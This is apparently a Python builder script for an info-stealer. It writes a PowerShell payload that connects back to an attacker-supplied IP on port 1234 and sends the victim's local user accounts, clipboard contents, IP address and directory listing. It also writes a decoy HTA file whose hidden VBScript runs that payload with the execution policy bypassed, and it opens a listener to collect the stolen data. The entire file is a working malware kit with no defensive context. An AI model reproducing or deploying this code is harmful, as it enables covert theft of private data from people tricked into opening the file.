import socket

ip = input("ip Server > ")
file = input("name file powershell > ")
filee = input("name file hta > ")
title = input("title hta > ")
text = input("text is displayed > ")

f = open(file+".ps1", "a")
f.write("""$socket = New-Object System.Net.Sockets.TcpClient
$socket.Connect('"""+ip+"""', 1234)
$ipconfig = Get-NetIPAddress | Where-Object { $_.InterfaceAlias -eq "Ethernet" -and $_.AddressFamily -eq "IPv4" }
$byte = [System.Text.Encoding]::ASCII.GetBytes('Data : ' + (Get-Date -DisplayHint Time) + ' > ' + (Get-LocalUser) + ' | ' + (Get-Clipboard) + ' | ' + ($ipconfig.IPAddress) + "`n Dirctory `n" + (Get-ChildItem))
$str = $socket.GetStream()
$str.Write($byte, 0, $byte.Length)""")
f.close()
print(f"File created powershell > {file}")

m = open(filee+".hta", "a")
m.write("""<html>
<head>
<title>"""+title+"""</title>
<meta charset="UTF-8">
</head>
<style>
body{
background:black;
text-align:center;
font-weight:900;
color:white;
overflow: hidden;
}
</style>
<body>
<script language="VBScript">
Dim objShell
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -executionpolicy bypass -File """+file+""".ps1", 0, True
</script>
<code>
<h1 style='color:red;'>"""+text+"""</h1>
</code>
</body>
</html>""")
m.close()
print(f"File created HTA > {filee}")

web_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
web_socket.bind((ip, 1234))
web_socket.listen()
print(f"on socket")

client_so, client_ad = web_socket.accept()
print("connected")

while True:
    data = client_so.recv(1024).decode()
    if not data:
        break
    print(data)
    
client_so.close()
web_socket.close()